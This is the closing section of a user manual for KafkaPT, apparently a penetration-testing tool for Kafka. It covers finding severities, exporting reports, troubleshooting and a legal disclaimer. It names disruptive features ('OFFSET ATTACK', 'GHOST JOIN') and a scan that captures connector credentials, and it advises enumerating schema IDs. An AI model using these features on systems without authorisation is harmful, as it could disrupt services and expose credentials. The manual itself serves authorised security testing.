| **Phase** | Which test phase found it: `recon`, `authz`, `injection`, `data`, `infra` |
| **Time** | UTC timestamp |
| **Description** | Full explanation of the risk and its business impact |
| **Evidence** | Raw data proving the finding (message content, topic, offset, config value, etc.) |

**What to do with each severity:**

| Severity | Action |
|---|---|
| CRITICAL | Report immediately. Pause testing and notify the system owner. |
| HIGH | Prominent in the report. Requires immediate remediation. |
| MEDIUM | Include in report. Remediate in the next sprint. |
| LOW | Include in report. Schedule for remediation. |
| INFO | Provide as context. Not a vulnerability on its own. |

---

## 20. Exporting Results

### Findings report (Markdown)

1. Go to the **FINDINGS** tab.
2. Click **EXPORT MARKDOWN**.
3. Choose a file path. The output is a `.md` file sorted by severity, with full descriptions and evidence for every finding.

### Message evidence (NDJSON)

1. Go to the **READ** tab after consuming messages.
2. Click **EXPORT NDJSON**.
3. Each line in the output file is a complete JSON record containing: topic, partition, offset, timestamp, Kafka headers (as name/value pairs), decoded value, and raw hex bytes.

---

## 21. Troubleshooting

**`confluent-kafka not installed`**
```bash
pip install confluent-kafka
```

**`fastavro not installed`**
```bash
pip install fastavro
```

**Cannot connect to the broker**
- Check the broker address and port (`9092` for plain, `9093` for SSL, varies).
- For mTLS: verify all three certificate files are selected and the paths are correct.
- Try unchecking **Verify server certificate** if using a self-signed certificate.
- Check firewall rules — your IP must be able to reach the broker port.

**Schema fetch returns HTTP 404**
- The schema ID does not exist. Try IDs `1`, `2`, `3`, etc.
- Use the **ENUMERATE** feature to find which IDs exist.

**RECON shows no topics**
- Your certificate may not have `DESCRIBE` permission on any topics.
- Check whether the log shows `TOPIC_AUTHORIZATION_FAILED` — that itself is useful pentest information.

**Burp proxy connection test fails**
- Make sure Burp Suite is running with its Proxy listener enabled.
- Confirm the port in KafkaPT matches the Burp listener port (default 8080).
- Click **TEST** in CONFIG → PROXY/BURP for a diagnostic message.

**Messages appear as hex / unreadable binary**
- Load the correct schema first in CONFIG → SCHEMA.
- Or check **Ignore schema** in the READ detail view and set **Display as** to `auto-detect` or `UTF-8 raw`.

**Font too small on 4K screen**
- Change the **Font:** combo in the header bar from `100%` to `125%`, `150%`, or `175%`.

**Python version error**
KafkaPT requires Python 3.11 or newer:
```bash
python3 --version
```

---

## 22. Legal Disclaimer

**This tool is provided for authorised security testing and research only.**

- You must have **explicit written permission** from the system owner before testing any Kafka environment with KafkaPT.
- Unauthorised access to computer systems is illegal in most jurisdictions (e.g. Computer Fraud and Abuse Act in the US, Computer Misuse Act in the UK, Ustawa o cyberbezpieczeństwie in Poland).
- The authors of KafkaPT accept no liability for any unauthorised or illegal use of this software.
- Always operate within the agreed scope of a penetration test engagement.
- The `OFFSET ATTACK` and `GHOST JOIN` features can disrupt production services. Use only in isolated test environments or with explicit, documented authorisation.
- The `FULL SCAN` in the CONNECT tab reads connector configurations that may contain production credentials. Handle captured data in accordance with your engagement's data handling policy.

**Use responsibly. Test ethically.**

---

*KafkaPT v2.5 — developed for the security research community.*
